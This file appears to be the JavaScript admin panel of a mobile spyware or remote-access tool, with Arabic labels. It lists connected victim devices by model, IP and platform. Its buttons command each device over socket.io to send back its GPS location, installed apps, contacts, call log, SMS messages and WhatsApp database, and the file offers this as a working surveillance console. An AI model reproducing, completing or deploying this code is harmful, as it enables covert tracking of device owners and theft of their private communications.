const socket = io();
const devicesDiv = document.getElementById('devices');
const logsDiv = document.getElementById('logs');
const devicesMap = {}; // لتخزين بيانات الأجهزة

socket.emit('adminJoin');

// تحديث أو إضافة جهاز
function renderDevice(device){
  let d = devicesMap[device.id];
  if(!d){
    d = document.createElement('div');
    d.className = 'device';
    d.id = 'device_' + device.id;
    d.innerHTML = `
      <strong>${device.id}</strong> - ${device.model} - IP: ${device.ip}
      <div>المنصة: ${device.platform || 'N/A'}</div>
      <div>اللغة: ${device.language || 'N/A'}</div>
      <div>شاشة: ${device.screen ? device.screen.width+'x'+device.screen.height : 'N/A'}</div>
      <div id="extra_${device.id}"></div>
      <button onclick="requestLocation('${device.id}')">طلب الموقع</button>
      <button onclick="requestApps('${device.id}')">تطبيقات مثبتة</button>
      <button onclick="requestContacts('${device.id}')">جهات الاتصال</button>
      <button onclick="requestCallLog('${device.id}')">سجل المكالمات</button>
      <button onclick="requestSMS('${device.id}')">الرسائل</button>
      <button onclick="requestWhatsappDB('${device.id}')">قاعدة واتساب</button>
    `;
    devicesDiv.appendChild(d);
    devicesMap[device.id] = d;
  }
}

// إضافة سجل جديد
function addLog(msg){
  const log = document.createElement('div');
  log.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
  logsDiv.appendChild(log);
  logsDiv.scrollTop = logsDiv.scrollHeight;
}

socket.on('join', (device) => {
  renderDevice(device);
  addLog(`جهاز متصل: ${device.id}`);
});

// الردود على الطلبات
socket.on('requestResult', (payload) => {
  try{
    const obj = JSON.parse(payload);
    addLog(`Request ${obj.action} -> ${obj.to}: ${obj.ok ? 'نجاح' : obj.reason || 'فشل'}`);
    const extraDiv = document.getElementById('extra_' + obj.to);
    if(obj.ok && obj.result){
      switch(obj.action){
        case 'getLocation':
          extraDiv.innerHTML = `موقع: ${obj.result.data.lat}, ${obj.result.data.lon}<br>
          العنوان: ${obj.result.data.address || 'N/A'}`;
          break;
        case 'getInstalledApps':
          extraDiv.innerHTML = `تطبيقات مثبتة: ${obj.result.data.length} تطبيق`;
          break;
        case 'getContacts':
          extraDiv.innerHTML = `جهات الاتصال: ${obj.result.data.length}`;
          break;
        case 'getCallLog':
          extraDiv.innerHTML = `سجل المكالمات: ${obj.result.data.length}`;
          break;
        case 'getSMS':
          extraDiv.innerHTML = `الرسائل: ${obj.result.data.length}`;
          break;
        case 'downloadWhatsappDatabase':
          extraDiv.innerHTML = `قاعدة واتساب: ${obj.result.data ? 'متاحة' : 'غير متوفرة'}`;
          break;
        case 'getExtraData':
          extraDiv.innerHTML = `بيانات إضافية: ${JSON.stringify(obj.result.data).slice(0,200)}...`;
          break;
      }
    }
  }catch(e){}
});

// طلب البيانات من الجهاز
function requestLocation(deviceId){
  socket.emit('request', { to: deviceId, action: 'getLocation', options:{ timeout: 15000 }});
}
function requestApps(deviceId){
  socket.emit('request', { to: deviceId, action: 'getInstalledApps' });
}
function requestContacts(deviceId){
  socket.emit('request', { to: deviceId, action: 'getContacts' });
}
function requestCallLog(deviceId){
  socket.emit('request', { to: deviceId, action: 'getCallLog' });
}
function requestSMS(deviceId){
  socket.emit('request', { to: deviceId, action: 'getSMS' });
}
function requestWhatsappDB(deviceId){
  socket.emit('request', { to: deviceId, action: 'downloadWhatsappDatabase' });
}
function requestExtra(deviceId){
  socket.emit('request', { to: deviceId, action: 'getExtraData' });
}
